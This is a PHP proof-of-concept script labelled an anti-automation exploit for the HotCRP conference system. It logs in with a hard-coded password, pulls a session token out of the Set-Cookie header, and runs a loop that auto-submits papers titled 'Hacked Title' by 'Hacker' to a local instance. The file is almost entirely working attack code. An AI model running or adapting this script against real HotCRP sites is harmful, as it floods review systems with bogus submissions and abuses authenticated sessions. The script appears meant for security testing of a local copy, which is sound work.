<?php
	

	// Exploit for Anti-Automation in HotCRP.

	// Login into the site.

// Local copy of the site.
   $url = 'localhost/hotcrp-master/index.php';



// Local Copy.
	$email = '';
	$password= 'apdruo+yyi@prcr';


	$post_data = array(
		   'email' => $email,
		   'password' => $password,
		   'autologin' => '1'
	);
	                    

	$ch = curl_init($url);

	$postargs = http_build_query($post_data);

	curl_setopt($ch, CURLOPT_POST,true);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$postargs);


	$cookiefile = 'cookies.txt';
	curl_setopt($ch, CURLOPT_COOKIEJAR,realpath($cookiefile));


	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);	
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);	

	curl_setopt($ch,CURLOPT_HEADER,1);

	$output = curl_exec($ch);


	// Get the cookie.
	preg_match('/Set-Cookie: (.*)\s/',$output,$cookie);


$cookie_id=substr($cookie[1],(strpos($cookie[1],'=')+1)+8,8);

	// Change the number of automated submissions.
	$numsubmissions=1;
	
	for($i=0;$i < $numsubmissions;++$i) {

		curl_setopt($ch,CURLOPT_URL,'http://localhost/hotcrp-master/paper.php/new');


	$post_data = array(
		   'title' => 'Hacked Title',
		   'auname1' => 'Hacker',
		   'autologin' => '1',
		   'abstract' => 'Hacked Abstract',
		   'm' => 'pe',
		   'post' => $cookie_id,
		   'submitpaper' => '1',
		   'submitfinal' => '1'
	);


		$postargs = http_build_query($post_data);

			curl_setopt($ch, CURLOPT_POSTFIELDS,$postargs);


				$create=curl_exec($ch);

				print($create);



	}		
				curl_close($ch);
?>
